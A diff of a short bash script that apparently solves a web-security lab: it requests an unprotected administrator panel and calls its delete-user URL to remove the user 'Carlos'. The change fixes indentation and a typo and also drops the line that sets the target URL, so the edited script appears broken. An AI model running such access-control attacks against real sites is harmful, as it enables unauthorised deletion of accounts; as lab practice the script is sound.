@@ -1,7 +1,7 @@
 #!/bin/bash
 
 function delete_user() {
-  local url="$1"
+  
   admin_panel="${url}/administrator-panel"
   response=$(curl -s -o /dev/null -w "%{http_code}" "${admin_panel}")
 
@@ -12,13 +12,13 @@ function delete_user() {
    echo "(+) Deleting user Carlos..."
    response=$(curl -s -o /dev/null -w "%{http_code}" "${delete_user}")
     if [[ "${response}" -eq 302 ]]; then
-    echo "(+) User Carlos delted successfully!"
+      echo "(+) User Carlos deleted successfully!"
     else
-    echo "(-) Something went wrong! Could not delete user Carlos"
+      echo "(-) Something went wrong! Could not delete user Carlos"
     fi
   else
-  echo "(-) Could not find admin panel."
-  echo "(-) Exiting the script..."
+    echo "(-) Could not find admin panel."
+    echo "(-) Exiting the script..."
   fi
 }
 
